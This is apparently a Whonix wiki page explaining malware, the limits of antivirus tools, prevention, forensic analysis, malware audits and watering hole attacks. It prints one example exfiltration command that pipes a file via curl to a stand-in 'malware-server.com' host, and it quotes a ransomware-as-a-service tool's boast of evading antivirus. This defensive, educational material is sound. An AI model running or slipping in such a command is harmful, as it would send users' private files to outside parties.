{{Header}}
{{title|title=
Malware, Computer Viruses and Antivirus Scanners
}}
{{#seo:
|description=Computer Virus Infections (Malware), Protecting Against Virus Infections
|image=Malware-1446109640.jpg
}}
{{malware_mininav}}
[[File:Malware-1446109640.jpg|thumb]]
{{#widget:Icon_Bullet_List

|addClass=minimal margin-bottom-20

|fontSize=17px

|item=fa-solid fa-check cs-blue,Virus is often used as a synonym for malware.

|item=fa-solid fa-check cs-blue,Computer infections include viruses&comma; trojan horses&comma; spyware&comma; ransomware and other categories of malware.

|item=fa-solid fa-check cs-blue,Malware stands for malicious software. A computer virus is a an undesirable program running on the user's computer often without their consent or even without their knowledge.

|item=fa-solid fa-check cs-blue,Preventing malware infections is very important because malware can steal your identity&comma; passwords&comma; accounts&comma; impersonate you&comma; steal all your private data&comma; you risk getting SWATTed <a href=#The_Importance_of_a_Malware_Free_System>and more</a>.

|item=fa-solid fa-check cs-blue,Computer security&comma; a computer that is free of malware&comma; requires a security concept. Just only installing an antivirus scanner is insufficient.

|item=fa-solid fa-check cs-blue,Detection and removal of malware is a hard problem. The utility of antivirus tools is actually rather limited. A much safer security concept needs to focus on prevention of malware infections&comma; not on malware detection.

}}
= Malware =
== The Importance of a Malware Free System ==

Malware has malicious intent and can potentially: <ref>
https://en.wikipedia.org/wiki/Malware
</ref>

<div style="column-count:2;-moz-column-count:2;-webkit-column-count:2">
* View and take snapshots of the desktop.
* Peruse files and folders.
* Gain access to protected data when decrypted.
* Exfiltrate, corrupt or destroy data (particularly financial and personal information).
* Plant fabricated evidence.
* Damage operating system functionality.
* Encrypt the data of a drive(s) and demand payment for decryption ([https://en.wikipedia.org/wiki/Ransomware ransomware]).
* Display unwanted advertising.
* Install unwanted software.
* Install persistent [https://en.wikipedia.org/wiki/Rootkit rootkits], [[Backdoor#Malicious_Backdoor|Malicious Backdoor]]s or even persistent [[Backdoor#Hardware_Backdoor|Hardware Backdoor]]s that can even survive a complete operating system re-installation.
* Track browsing and other behavior.
* Remotely turn on webcams and microphones.
* Create "zombie" computers which form part of a botnet for spam email, [https://en.wikipedia.org/wiki/Denial-of-service_attack#Distributed_attack DDOS attacks] or the hosting of illicit / illegal material which might result in getting [https://en.wikipedia.org/wiki/Swatting SWATted].
* Record everything a user types, sends and receives.
</div>

{{mbox
| type      = notice
| image   = [[File:Ambox_notice.png|40px|alt=Info]]
| text    = The integrity of the host is a critical part of the system's [https://en.wikipedia.org/wiki/Trusted_computing_base Trusted Computing Base]. If the host system is compromised by [https://en.wikipedia.org/wiki/Malware malware], so is every {{VM}}.
}}

== {{project_name_short}} Antivirus ==
# {{project_name_short}} is [[Based_on_Debian|based on Debian]] and using the Linux kernel. There exists much less malware for Linux generally.
# {{project_name_short}} comes with many [https://www.{{project_clearnet}}/#security security features].
# The more you know, the safer you can be. See [[Documentation]].

== Targeted Malware vs Off-The-Shelf Malware ==

Targeted malware is the opposite of off-the-shelf malware. Targeted malware is specifically crafted against a known target to attack a specific system or limited amount of systems only. The goal is to avoid detection by not being installed on too many systems where qualified people might detect the malware and publish the findings.

On the other hand, off-the-shelf malware attempts to spread in bulk against larger groups or the general public with the goal of taking over as many systems as possible. It should be noted that malware tools are widely available, with proof-of-concept ransomware even existing on GitHub at the time of writing. For example, the "DemonWare" tool can be utilized to create malicious payloads for ransomware, adware or general malware purposes on the Windows, Linux and macOS platforms: <ref>https://github.com/junseul/Ransomware_RAASNet/blob/master/RAASNet.py</ref>
<blockquote>Your Ransomware As A Service (RAAS) Tool for all your hacking needs. ... This was made to demonstrate ransomware and how easy it is to make. It works on Windows, Linux and MacOS. It's recommended to compile payload.py to EXE to make it more portable. ... This script does not get detected by any anti-virus.
Self made scripts go undetected 99% of the time. It's easy to write something nasty like ransomware, adware, malware, you name it. ... I recommend a VPN that allows port forwarding (For example; PIA VPN) when using this outside your network, or better, a cloud computer hosted elsewhere, like Amazon AWS. The conclusion of this project is that it is easy to brick a system and earn money doing it. This script doesn't use any exploits to achieve its goal, but can easily be coded into it as a nice feature.</blockquote>

Malware creators are likely to utilize existing software samples to create more pernicious tools with features like: greater payload customization (custom files), man-in-the-middle and DNS poisoning (website redirection), email payloads and email spoofing, anti-virus or other detection warnings, focused data gathering (passwords or other sensitive files), detection of mounted drives (for encryption), encrypted transfer of traffic between payloads and malicious servers, and much more.

== The Utility of Antivirus Tools ==

Antivirus products and [https://en.wikipedia.org/wiki/Personal_firewall personal firewalls] are ''not'' drop in solutions for a secure host. Malware can often stay undetected and evade scans, while application level personal firewalls are often circumvented. <ref>https://www.grc.com/lt/leaktest.htm</ref> [https://en.wikipedia.org/wiki/Polymorphic_code Polymorphic code] and [https://en.wikipedia.org/wiki/Rootkit rootkits] essentially render antivirus products helpless. <ref>
https://arstechnica.com/security/2014/05/antivurus-pioneer-symantec-declares-av-dead-and-doomed-to-failure/
</ref> <ref>
[https://www.reddit.com/r/IAmA/comments/sq7cy/iama_a_malware_coder_and_botnet_operator_ama/?limit=500000 A botnet author brags in this thread of writing unbeatable malware and trolling antivirus vendors.]
</ref>

[https://forums.whonix.org/t/installation-of-antivirus-scanners-by-default/9755 The following paragraph is currently being discussed.]

Antivirus tools are actually worse than useless. In the case of sophisticated and targeted attacks, the antivirus software can serve as a pathway to exploiting a system's kernel, since they almost always run with administration level privileges. <ref>
https://theintercept.com/2015/06/22/nsa-gchq-targeted-kaspersky/
</ref> Some antivirus software also harms privacy by sending system files back to the company servers for analysis. <ref>
https://www.schneier.com/blog/archives/2017/10/more_on_kaspers.html
</ref> The software also actively conducts man-in-the-middle attacks on secure SSL connections, enabling very sensitive information to be inspected. <ref>
https://bugs.chromium.org/p/project-zero/issues/detail?id=978
</ref> Research found that HTTPS inspection features in some antivirus decreased the security offered by HTTPS, while introducing vulnerabilities that allows connecting to websites with self-signed certificates (possibly signed by an active attacker conducting MITM) without warning, totally compromising the security offered by HTTPS. <ref>
https://zakird.com/papers/https_interception.pdf
</ref>

https://privsec.dev/posts/knowledge/badness-enumeration/#antiviruses

== Preventing Malware Infections ==

The optimal scenario is to avoid infection by malware in the first place. Once malicious code has accessed a system, it is next to impossible to contain. Sensible steps include: hardening the operating system, carefully vetting programs and files that are retrieved from the Internet, using hypervisors (virtualizers) to isolate software that processes untrusted data, and periodically deleting and recreating virtual machines that are used for sensitive operations. <ref>For instance, in {{q_project_name_long}} this would involve the occasional deletion and recreation of {{project_name_long}} AppVMs.</ref>

In the event a system compromise is strongly suspected or confirmed, the ultimate goal is to re-establish a trusted, private environment for future activities -- see [[Disaster_Recovery|Compromise Recovery]] for  techniques to recover from {{project_name_short}} (host or VM) infections.

== Detecting Malware Infections ==

Detecting off-the-shelf (standardized) malware is a very hard problem and conceptually a lost cause.

{{Quotation
|quote=
The inconvenient and somehow embarrassing truth for us - the malware experts - is that there does not exist any reliable method to determine if a given system is ''not'' compromised. True, there is a number of conditions that can warn us that the system is compromised, but there is no limit on the number of checks that a system must pass in order to be deemed “clean”.
|context=[https://www.qubes-os.org/news/2017/04/26/qubes-compromise-recovery/#digression-about-detecting-compromises Joanna Rutkowska, security researcher and founder of Qubes OS]
}}

If uncustomized malware is widespread enough, then it has a chance of being detected by a technician. Targeted malware might also get detected by a technician, but the likelihood is low unless they are lucky or gifted.

Non-technical users do not have many good options. They can either:

* Spend a few years to rapidly increase their knowledge base of operating systems, network protocols, package analysis, programming, disassembly etc., and then try their luck.
* Pay exorbitant sums to a technician to try and find system malware, even though there is no certainty of success. <ref>The salary costs for a security researcher / malware analyst over an extended period rule this out for most individuals.</ref> <ref>https://forums.whonix.org/t/document-recovery-procedure-after-compromise/3296/12
</ref>
* Or seek the voluntary assistance of a technician to find malware, if they are both a high value target and have a reasonable rationale for why they are likely compromised. <ref>Only a select group of people fall into this group, for instance, whistleblowers targeted and infected by targeted viruses. Experts might be located who are willing to conduct analysis pro bono; later publicizing their findings for the public benefit.</ref>

{{Anchor|Detection of System Changes}}
{{Anchor|Indicators of Compromise}}
{{Anchor|Compromise Indicators}}

== Finding Vulnerabilities ==
Finding [https://en.wikipedia.org/wiki/Vulnerability_(computing) vulnerabilities] in software is a complex task. A deep understanding of the source code, the ability to interpret disassembly, and/or proficiency with specialized tools (like static or dynamic analysis tools such as valgrind) are essential. Often, these skills are beyond the reach of typical users, making it primarily a domain for software developers and security researchers.

Examples:

* For a discussion on identifying vulnerabilities in C code or disassembly, see [https://stackoverflow.com/questions/67336225/why-is-this-binary-vulnerable-to-buffer-overflow Why is this binary vulnerable to buffer overflow?]
* For a detailed vulnerability research report, refer to [https://seclists.org/oss-sec/2022/q1/68 CVE-2021-3998 and CVE-2021-3999 in glibc's realpath() and getcwd()].

== Valid Compromise Indicators versus Invalid Compromise Indicators ==

If trivial changes are noticed on your system -- such as a duplicate desktop icon -- this is not evidence of malware, a hack, or leak. Similarly, if warning or error messages appear that are difficult to understand, in most cases there is no need for panic. If something unexpected occurs such as the appearance of a "htaccess file in home directory", or graphical glitches emerge in some applications, then it is more likely a harmless bug and/or usability issue rather than a compromise. Never in the history of [https://en.wikipedia.org/wiki/Malware_analysis malware analysis], security researchers relied on unexpected occurrences such as duplicate desktop icons. Malware analysis is a skill that requires studying malware detection techniques. It's not a skill that can be casually picked up by pure observation and guesswork.

Skilled attackers do not leave such obvious traces of their breach. An infection by tailored malware is more plausible in this scenario, and this is virtually impossible to detect by reading random messages in system logs. Even malware that is bought off-the-shelf (malware building toolkits) is unlikely to be discovered by cursory inspections. <ref>
Interested readers can verify these claims by researching off-the-shelf malware building toolkits. They are dangerous to install for inexperienced users, but there is a wealth of information online such as screenshots and video tutorials.
</ref> [https://en.wikipedia.org/wiki/Rootkit Rootkit] technology is no doubt a standard feature of the various programs.

Strange files, messages, or other system behavior could feasibly relate to an attacker wanting the user to find something. However, the likelihood of this kind of harassment is considered low. [https://en.wikipedia.org/wiki/Script_kiddie Script kiddies] ("skiddies") are unskilled attackers who use scripts or programs to conduct attacks on computer systems and networks, most often with juvenile outcomes. For example, they might use programs to remotely control poorly-secured [[Windows Hosts|Microsoft Windows]] desktops, trolling their victims from an open, forced chat window, opening their DVD drive, and so on. It is improbable that skiddies can achieve similar exploits against Linux, Xen, or BSD platforms. <ref> It is unclear if script kiddie programs are readily available for attacking non-Microsoft Windows users. </ref> Sophisticated attackers (who are likely to use tailored malware) generally avoid detection unless the user is unlucky enough to be a victim of [https://en.wikipedia.org/wiki/Zersetzung Zersetzung] (a psychological warfare technique).

How malware actually works: Contrary to popular belief, most sophisticated malware operates in a way that is designed to avoid detection by the user entirely. A common misconception is that malware will cause noticeable changes to the system, such as altering the desktop background, changing visual styles, moving windows around, or switching the default applications of the operating system. In reality, effective malware is far more subtle.

For instance, a piece of malware designed to steal data might execute a command to upload sensitive files to a remote server without altering the system in a way that would draw attention. Consider the following example:

<pre>
cat sensitive_file.txt | curl -X POST -d @- http://malware-server.com/upload
</pre>

In this example, the command reads the contents of a file (in this case, <code>sensitive_file.txt</code>) and immediately uploads it to a malicious server (<code>malware-server.com</code>). This entire operation can occur silently in the background, with no visible signs to the user that something is amiss. At no point during this process are there user-noticeable changes. The malware's success hinges on its ability to remain invisible, operating quietly behind the scenes while carrying out its malicious activities.

Every forum post and support request requires time that could otherwise be directed to {{project_name_short}} development. Unless there is genuine evidence of a serious and credible problem, there is no need for a new post. See also [[Reporting_Bugs#Support_Request_Policy|Support Request Policy]] ([[Reporting_Bugs#Policy_Rationale|rationale]]). Developers and the {{project_name_short}} community at large do not have enough time to explain every message that Linux might report. In most cases, they are not important and outside the control of {{project_name_short}} developers.

== False-Positive Antivirus Reports ==
When an antivirus program reports having found a virus or other issue, it doesn't necessarily mean that there is an actual issue. According to [https://www.av-comparatives.org AV comparatives] and many other sources, there are false-positive reports, also known as false alarms. For example, you can see the results of the [https://www.av-comparatives.org/tests/false-alarm-test-march-2022/ False Alarm Test March 2022]. A virus or issue found report is, at best, an indication that there could be an issue, but there is no definitive proof.

Furthermore, the usefulness of antivirus reports is limited because, for most (if not all) commercial vendors of antivirus software, it is not easy or even impossible for the user and outside developers to get in contact with a [https://en.wikipedia.org/wiki/Malware_analysis malware analyst] at the antivirus company to receive further information, virus confirmation, bug reports, and so forth.

This issue is exacerbated by commercial antivirus software and their database, which are usually [https://en.wikipedia.org/wiki/Proprietary_software closed source] or even [https://en.wikipedia.org/wiki/Obfuscation_(software) obfuscated]. Therefore, even outside developers have a hard time investigating virus reports.

== Proofing an Actual Security Vulnerability ==
To prove that there is an actual security issue, more than a report by an antivirus scanner is required. This is due to the possibility of false alarms by antivirus software.

Proof of actual vulnerabilities could include showing a code issue in the [https://en.wikipedia.org/wiki/Source_code source code], in the [https://en.wikipedia.org/wiki/Disassembler disassembly], malicious behavior in a [https://en.wikipedia.org/wiki/Debugger debugger], a capture of the network traffic from a [https://en.wikipedia.org/wiki/Packet_analyzer packet analyzer] or [https://en.wikipedia.org/wiki/Proof_of_concept proof of concept (PoC)] [https://en.wikipedia.org/wiki/Exploit_(computer_security) exploit].

== Attribution of Security Vulnerabilities to Software ==
If a file is reported as infected by a virus scanner it does not necessarily follow that the reported file is the origin of the virus. This is due to file-infecting viruses.

What is a file-infecting virus? A file-infecting virus is a type of malware that infects files with the intent to cause permanent damage, make them unusable or spread itself to make detection and removal of the virus harder. A file-infecting virus injects its own code into different files.

== False-Positive Log Reports ==

{{mbox
| type    = notice
| image   = [[File:Ambox_notice.png|40px|alt=Info]]
| text    = '''Reminder:''' {{project_name_short}} is not perfect. The security issues facing society are great, but there are few volunteers who are ''seriously'' investing the effort to challenge and resolve them.
}}

{{Should_I_be_concerned}}

= Firmware Trojans =

See [[Backdoor#Firmware_Trojan|Firmware Trojan]].

= Backdoors =
See [[Backdoor|Backdoors]].

= Vulnerability versus Malicious Backdoor =
See [[Backdoor#Vulnerability_versus_Malicious_Backdoor|Vulnerability versus Malicious Backdoor]].

= Basics of Malware Analysis and Backdoor Hunting =

Malware analysis and backdoor hunting are processes used to investigate whether a device has been compromised by malicious software or unauthorized access tools.

A critical rule in malware analysis is: '''never boot from the potentially infected device'''. Doing so can allow malware or backdoors to activate, erase evidence, hide themselves, or attempt to spread to other systems. Even reading the device from its own operating system cannot be trusted, as it may be compromised and present false or incomplete information.

<u>Malware Analysis and Backdoor Hunting Procedure:</u>

* '''Power off the device immediately''': Prevent any further changes or activity by the malware.
* '''Extract data using a trusted, external system''': This is often done by removing the storage and connecting it to a clean forensic workstation, if possible.
* '''Use a write blocker''': This ensures that the forensic workstation does not modify the original data on the device.
* '''Analyze the storage as raw data''': Specialized forensic tools are used to inspect files, logs, and hidden sectors without running any executable content from the device.

If storage cannot be physically removed (e.g., in most modern Android devices), then analysis is extremely limited without rooting or exploiting the device, which can itself alter data and evidence.

For a secure and thorough investigation, it might be advisable that the device should be handled using proper forensic protocols by trained professionals. <ref>
* https://en.wikipedia.org/wiki/Rootkit#Detection
* https://web.archive.org/web/20100911033147/http://download.microsoft.com/download/a/b/e/abefdf1c-96bd-40d6-a138-e320b6b25bd3/understandingantimalwaretechnologies.pdf
* https://web.archive.org/web/20091007031103/http://www.symantec.com/avcenter/reference/testing_methodology_for_rootkit_removal.pdf
* https://www.reddit.com/r/AskNetsec/comments/b8i59x/how_do_you_proceed_after_receiving_a_malware/
* https://www.reddit.com/r/cybersecurity/comments/z1c81t/for_malware_testing_how_can_i_be_sure_that_the/
* https://www.reddit.com/r/cybersecurity/comments/p1g4ey/interview_question_first_thing_to_do_if_a/
</ref>

Volatile Memory (RAM): If the device is running when discovered, first acquire a memory dump (RAM capture) before powering off, since malware and useful evidence may reside only in memory and will be lost when the power is disconnected.

One strategy is to cut network access to prevent further risk of randomware encryption), data exfiltration or malware hiding itself and/or powering off.

There are at least two major strategies.

* A) authorship attribution, malware analysis; or
* B) damage containment

= Malware Audits =
It is ''theoretically'' possible to discover malware by comparing an already used/booted, [[Download|supported]] VM image such as a VirtualBox <code>.ova</code> image or Qubes template with the original. However, at the time of writing this is infeasible for {{project_name_short}} developers.

{{quotation
|quote={{no_leaks_policy}}
|context=[[Contact#No_Leaks_Policy|{{project_name_short}} No Leaks Policy]]
}}

Qubes OS has a forum category [https://forum.qubes-os.org/c/user-support/help-i-think-ive-been-hacked/42 Help, I think I’ve been hacked sub forum]. ([https://forum.qubes-os.org/t/about-the-help-i-think-ive-been-hacked-category/20366 category description]) ([https://forum.qubes-os.org/t/proposal-i-think-i-got-hacked-sub-category-of-user-support/10482 Proposal: “I think I got hacked” sub-category of “User Support”] contains reasoning why these kinds of posts have been "banished" into a sub forum.) At time of writing, there was little to no developer or malware analyst activity in that sub forum. Reasons for that are as follows.

Quote security researcher, [https://www.qubes-os.org/news/2017/04/26/qubes-compromise-recovery/ Joanna Rutkowska, founder of Qubes OS]:

<blockquote>The inconvenient and somehow embarrassing truth for us – the malware experts – is that there does not exist any reliable method to determine if a given system is not compromised. True, there is a number of conditions that can warn us that the system is compromised, but there is no limit on the number of checks that a system must pass in order to be deemed “clean”.</blockquote>

Professional malware audits require a completely different skill set to software development, such as forensic and research capabilities, along with a laboratory facility. An analogy is expecting a professional chef to identify the source and quality of every ingredient used in an already cooked meal; this expectation is completely unrealistic. Like most, if not all Linux distributions, {{project_name_short}} relies upon many different software packages which are developed by countless independent parties; see [[Linux User Experience versus Commercial Operating Systems]] to learn more about the Linux organizational structure.

The likelihood of discovering purposeful modifications is low until fully [https://reproducible-builds.org/ reproducible builds] (or at least [[Verifiable Builds]]) are available. Presently there is not a single Linux distribution installation whose image can be re-built deterministically by independent third parties. That means introduced modifications cannot be easily discovered during the compilation process. As the Reproducible Builds project has stated:

<blockquote>The motivation behind the Reproducible Builds project is therefore to allow verification that no vulnerabilities or backdoors have been introduced during this compilation process.</blockquote>

As the [https://www.qubes-os.org/news/2021/02/28/improvements-in-testing-and-building/#reproducible-builds Qubes OS project] has stated:

<blockquote>(A “rebuilder” is a program that takes a binary and its purported source code as inputs, along with any applicable metadata, and attempts to build an identical binary from the source code. The goal is to check whether the binary was really compiled from its claimed source code.)</blockquote>

Proper malware audit capabilities are conditional upon several key milestones:

# Completion of Debian's [https://wiki.debian.org/ReproducibleBuilds Reproducible Builds] project -- 91% of packages currently build reproducibly in Debian <code>bullseye</code>.
# All packages build reproducibly in Debian and other Linux distributions.
# The Linux distribution policy mandates package repoducibility.
# Independent package rebuilders become available.
# Note that reproducible package builds are <u>not</u> equivalent to reproducible installed packages. <ref>
Many files in <code>/etc</code> or <code>/var</code> are auto generated at package installation time.
</ref>
# The Reproducible Builds project works towards reproducible installation CD/DVD images. <ref>This is a prerequisite for at least partially reproducible installed packages which are required by the installer.</ref>
# Independent installation image rebuilders become available.
# Reproducible VM images become feasible.
# Independent VM image rebuilders become available.
# Auditing already used (VM) images is increasingly feasible.

To date only the first milestone has been partially accomplished. Completing the remaining prerequisite milestones will probably take many years of difficult engineering work.

See also:
<div style="column-count:2;-moz-column-count:2;-webkit-column-count:2">
* [[Verified Boot]]
* [[#Backdoors|Backdoors]]
* [[Trust]]
* [[Linux User Experience versus Commercial Operating Systems]]
</div>

= Watering Hole Attacks =

It should be noted that advanced malware can infect a user's computer via a [https://www.techopedia.com/definition/31858/watering-hole-attack Watering Hole Attack]. This vector has similarities to the software version of a [[Firmware_Security_and_Updates#Supply_Chain_Attacks|Supply Chain Attack]], and these methods are not mutually exclusive: <ref name=Watering_hole_attack>
https://www.techopedia.com/definition/31858/watering-hole-attack
</ref>

<blockquote>A watering hole attack is a malware attack in which the attacker observes the websites often visited by a victim or a particular group, and infects those sites with malware. A watering hole attack has the potential to infect the members of the targeted victim group. Although uncommon, a watering hole attack does pose a significant threat to websites, as these attacks are difficult to diagnose.</blockquote>

In the case of {{project_name_short}} users, any future attempt would logically target hosted content on GitHub, SourceForge, various forum locations,  mirrors, popular documentation links, and frequently visited security and anonymity sites like Tails, The Tor Project and so on. <ref>
More commonly attacks favor banks, large organizations and government offices due to the obvious political and profit motives.
</ref> The hope is that developers, contributors and general users of the software become infected with stealthy malware that is immune to detection.

The attack involves a few steps: <ref name=Watering_hole_attack /> <ref
>https://en.wikipedia.org/wiki/Watering_hole_attack
</ref>

# Zero-day or other vulnerabilties target the website software.
# Malicious JavaScript or HTML are most often used to inject malicious programming code.
# The code redirects visitors to a different site that serves "malvertisments" or malware masquerading as legitimate software.
# Once installed, the malware can infect various members of the targeted group.

It should be noted that advanced adversaries are capable of gaining knowledge about the behavioral patterns of target groups -- where they congregate, topics of research, related interests, and handle mapping of anonymous networks. This generic browsing and membership knowledge, along with observed security practices, greatly narrows the number of specific sites that need be targeted and the suitable attack mode. One way to mitigate this threat is to rigorously inspect websites for malicious code.

Interested readers can learn about six recent watering hole attacks targeting the US, China, banks and other entities [https://en.wikipedia.org/wiki/Watering_hole_attack#Examples here].

= See Also =
* [[Mental Model]]
* [[Threat Modeling]]
* [[Disaster Recovery]]
* [[Factory Reset]]
* [[Operating System Software and Updates]]
* [[System Hardening Checklist]]
* [[Firmware Security and Updates]]
* [[Open-source Hardware]]
* https://github.com/tylabs/quicksand

= References =
{{reflist|close=1}}

{{Footer}}

[[Category:Documentation]]